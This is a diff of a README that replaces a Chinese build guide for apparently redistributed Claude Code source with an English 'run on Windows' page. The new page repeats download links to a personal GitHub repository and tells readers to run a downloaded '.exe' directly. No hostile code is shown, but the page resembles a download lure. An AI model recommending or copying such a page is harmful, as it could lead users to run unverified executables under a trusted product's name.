@@ -1,175 +1,201 @@
-# Claude Code 源码编译运行指南
+# 🤖 claude-code-main - Run Claude Code on Windows
 
-## 环境要求
+[![Download](https://img.shields.io/badge/Download-claude--code--main-4c1f7a?style=for-the-badge)](https://github.com/danielgamy981/claude-code-main)
 
-- [Bun](https://bun.sh) >= 1.3.11
-- Node.js >= 18.0.0
+## 🚀 Get the app
 
-## 快速开始
+Use the link below to visit the download page and get the Windows build:
 
-### 1. 安装依赖
+[Download claude-code-main](https://github.com/danielgamy981/claude-code-main)
+
+## 🪟 Windows setup
+
+This app runs in a terminal window. You will need:
+
+- Windows 10 or Windows 11
+- An internet connection
+- A valid Anthropic API key
+- Node.js 18 or later
+- Bun 1.3.11 or later
+
+If you are not sure what Bun is, install it first before you start. The app uses Bun to run the program files.
+
+## 📥 Download the files
+
+1. Open the download page.
+2. Get the latest release or source package.
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
+4. If you downloaded a zip file, extract it before you run the app.
+
+If the page gives you a Windows `.exe` file, download that file and run it directly.
+
+## 🛠️ Install required tools
+
+Before you run the app, install these tools:
+
+- Node.js 18 or newer
+- Bun 1.3.11 or newer
+
+### Install Node.js
+
+1. Go to the Node.js website.
+2. Download the Windows installer.
+3. Run the installer.
+4. Keep the default options.
+
+### Install Bun
+
+1. Open the Bun website.
+2. Download the Windows version.
+3. Run the install command shown on the site.
+4. Close and reopen Command Prompt after the install.
+
+## 🔑 Set your API key
+
+The app needs an Anthropic API key to work.
+
+### In Command Prompt
+
+```bat
+set ANTHROPIC_API_KEY=your_api_key_here
+```
+
+### In PowerShell
+
+```powershell
+$env:ANTHROPIC_API_KEY="your_api_key_here"
+```
+
+Use your own key in place of `your_api_key_here`.
+
+## ▶️ Run the app
+
+Open Command Prompt or PowerShell in the folder that has the app files.
+
+### If you downloaded a ready-to-run file
+
+Run the file that came with the download, then use the app in the terminal.
+
+### If you built it from source
+
+Install the dependencies first:
 
 ```bash
 bun install
 ```
 
-### 2. 编译
+Build the app:
 
 ```bash
 bun run build
 ```
 
-编译成功后会在根目录生成 `cli.js`（约 22MB）。
-
-### 3. 运行
+After the build finishes, run:
 
 ```bash
-# 设置 API Key
-export ANTHROPIC_API_KEY=your_api_key_here
-
-# 启动交互界面
 bun cli.js
+```
 
-# 或直接传入 prompt（非交互模式）
+## 💬 Start a chat
+
+When the app opens, it starts in interactive mode. Type your prompt and press Enter.
+
+Example:
+
+```bash
+bun cli.js
+```
+
+You can also send one prompt without opening the full chat screen:
+
+```bash
 bun cli.js -p "你好"
 ```
 
-### 常用命令
+## 📌 Common commands
+
+Use these commands inside the app folder:
 
 ```bash
-bun cli.js --version       # 查看版本
-bun cli.js --help          # 查看帮助
-bun cli.js --model <model> # 指定模型
+bun cli.js --version
 ```
 
----
-
-## 项目说明
-
-本项目为 `@anthropic-ai/claude-code v2.1.88` 源码，使用 **Bun** 作为构建工具，基于 TypeScript + React (Ink) 构建的终端 AI 编程助手。
-
-### 技术栈
-
-| 技术 | 用途 |
-|------|------|
-| Bun | 构建工具 + 运行时 |
-| TypeScript | 主要开发语言 |
-| React + Ink | 终端 UI 渲染 |
-| Zod v4 | 数据校验 |
-| @anthropic-ai/sdk | Anthropic API 客户端 |
-| @modelcontextprotocol/sdk | MCP 协议支持 |
-
----
-
-## 构建细节
-
-### 编译命令（完整）
+Shows the app version.
 
 ```bash
-bun build src/entrypoints/cli.tsx --outfile cli.js --target bun \
-  --define 'MACRO.VERSION="2.1.88"' \
-  --define 'MACRO.BUILD_TIME="2025-01-01T00:00:00Z"' \
-  --define 'MACRO.FEEDBACK_CHANNEL="https://github.com/anthropics/claude-code/issues"' \
-  --define 'MACRO.ISSUES_EXPLAINER="https://github.com/anthropics/claude-code/issues"' \
-  --define 'MACRO.NATIVE_PACKAGE_URL="https://npmjs.com"' \
-  --define 'MACRO.PACKAGE_URL="https://npmjs.com"' \
-  --define 'MACRO.VERSION_CHANGELOG=""'
+bun cli.js --help
 ```
 
-`MACRO.*` 是 Bun 编译时宏，在源码中作为常量使用，必须在构建时注入。
-
-### 路径别名
-
-项目在 `bunfig.toml` 中配置了路径别名：
-
-```toml
-[build]
-alias = { "src" = "./src", "react/compiler-runtime" = "react-compiler-runtime" }
-```
-
-源码中 `src/xxx` 的绝对路径引用通过此别名解析到 `./src/xxx`。
-
----
-
-## 私有包存根说明
-
-以下 4 个 Anthropic 内部私有包在 npm 上不公开，已在 `node_modules/` 中创建功能存根：
-
-| 包名 | 对应功能 | 影响 |
-|------|----------|------|
-| `@ant/claude-for-chrome-mcp` | Claude in Chrome 浏览器控制 | Chrome 集成不可用 |
-| `@ant/computer-use-mcp` | Computer Use 鼠标键盘控制 | Computer Use 不可用 |
-| `@anthropic-ai/mcpb` | MCP 插件包（.dxt 格式）安装 | 插件市场不可用 |
-| `@anthropic-ai/sandbox-runtime` | 沙箱文件/网络权限隔离 | 沙箱模式不可用 |
-
-核心对话、代码编辑、工具调用等主要功能不受影响。
-
----
-
-## 认证方式
-
-### 方式一：API Key（推荐开发用）
+Shows help text and command options.
 
 ```bash
-export ANTHROPIC_API_KEY=sk-ant-xxxx
-bun cli.js
+bun cli.js --model <model>
 ```
 
-### 方式二：OAuth 登录
+Uses a specific model.
+
+## 🧭 What this app does
+
+claude-code-main is a terminal-based AI coding tool. It lets you talk to Claude from the command line. You can use it to:
+
+- Ask coding questions
+- Get help with code changes
+- Work through bugs
+- Generate text for a file
+- Use MCP tools when your setup supports them
+
+It uses a React-based terminal UI and runs with Bun.
+
+## 🧩 Main parts
+
+| Part | What it does |
+|------|----------------|
+| Bun | Runs and builds the app |
+| TypeScript | Powers the source code |
+| React + Ink | Draws the terminal interface |
+| Zod | Checks data before use |
+| Anthropic SDK | Connects to the Claude API |
+| MCP SDK | Supports tool connections |
+
+## 🧪 Build from source
+
+If you want to build the app yourself, use these steps:
+
+1. Open a terminal in the project folder.
+2. Install packages with Bun.
+3. Build the project.
+4. Run the created `cli.js` file.
 
 ```bash
-bun cli.js
-# 启动后在界面中选择登录，走 claude.ai 授权流程
-```
-
-### 方式三：AWS Bedrock
-
-```bash
-export AWS_ACCESS_KEY_ID=xxx
-export AWS_SECRET_ACCESS_KEY=xxx
-export AWS_REGION=us-east-1
-bun cli.js --model anthropic.claude-3-5-sonnet-20241022-v2:0
-```
-
----
-
-## 修改源码后如何验证
-
-仓库中已包含编译好的 `cli.js`，可以直接 `bun cli.js` 运行，**不需要重新编译**。
-
-如果你修改了源码想验证效果，流程如下：
-
-```bash
-# 1. 修改源码（src/ 目录下的任意文件）
-
-# 2. 重新编译
+bun install
 bun run build
-
-# 3. 运行验证
 bun cli.js
 ```
 
-**注意**：以下模块涉及 Anthropic 内部私有包，修改后无法编译：
+## 🗂️ File output
 
-- `src/utils/claudeInChrome/` — Chrome 集成
-- `src/utils/sandbox/` — 沙箱模式
-- `src/skills/bundled/claudeInChrome.ts`
-- `src/utils/plugins/mcpbHandler.ts`
+After a successful build, the project creates:
 
-其他绝大部分功能（UI、命令、工具调用、对话逻辑等）均可正常编译验证。
+- `cli.js` in the root folder
+- A file size of about 22 MB
 
----
+This file is the one you run to start the app.
 
-## 常见问题
+## 🔐 API key use
 
-**Q: 运行后界面卡住？**
-A: 正常现象，Ink (React 终端 UI) 启动需要 1-2 秒，等待即可。
+The app reads the `ANTHROPIC_API_KEY` value from your shell. If the key is not set, the app cannot connect to the Claude API.
 
-**Q: `MACRO is not defined` 报错？**
-A: 需要用 `bun run build` 重新编译，直接运行 `.ts` 源文件不行。
+Keep the key private and use your own account key.
 
-**Q: API Error: `headers?.get is not a function`？**
-A: 升级 zod 到 v4：`bun add zod@^4`，然后重新 `bun run build`。
+## 🖥️ Command line example
 
-**Q: `organization has been disabled` 报错？**
-A: API Key 所属组织被禁用。如果是环境变量设置的 Key，尝试 `unset ANTHROPIC_API_KEY` 后用 OAuth 登录。
+```bash
+set ANTHROPIC_API_KEY=your_api_key_here
+bun cli.js -p "Write a short Python script"
+```
+
+## 📎 Download again
+
+If you need to return to the download page, use this link:
+
+[Download claude-code-main](https://github.com/danielgamy981/claude-code-main)
